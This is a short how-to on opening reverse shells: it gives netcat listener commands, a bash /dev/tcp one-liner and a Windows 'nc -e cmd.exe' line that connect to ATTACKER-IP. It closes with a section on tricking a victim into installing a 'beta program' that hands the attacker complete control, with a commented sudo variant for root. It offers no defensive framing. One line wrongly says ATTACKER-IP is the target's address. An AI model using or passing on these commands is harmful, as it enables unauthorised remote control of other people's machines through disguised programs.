Commands

To know your IP address, type

	ifconfig # linux, mac
	ipconfig # windows

To setup a listener

	nc -lvp 4444

To connect to listener (inside a script)

	bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1

where ATTACKER-IP is the ip address of your target computer. Port should be the same as on attacker box, in this case 4444 but you can pick anyone.

If you are not in the same network, this should be your VPS IP (you can rent a VPS with Kali Linux). If you're on the same network, it can be your network IP.

You can add the command above to a bash script (or inside an existing one)

	chmod +x bad.sh   # make script executable
	./bad.sh          # run script

For Windows (using netcat)
	
	nc.exe ATTACKER-IP ATTACKER-PORT -e cmd.exe


Hacking Linux Machine

Linux computer install a beta program and this program will connect to Attacker Server. Attacker Server will have complete access to Vistim's Linux Machine. 

For Setting up Server

	nc -lvp PORTNUMBER

At Target Linux Machine, run Script
	
	#!/bin/bash
	bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1
	# sudo bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1	# For Root access
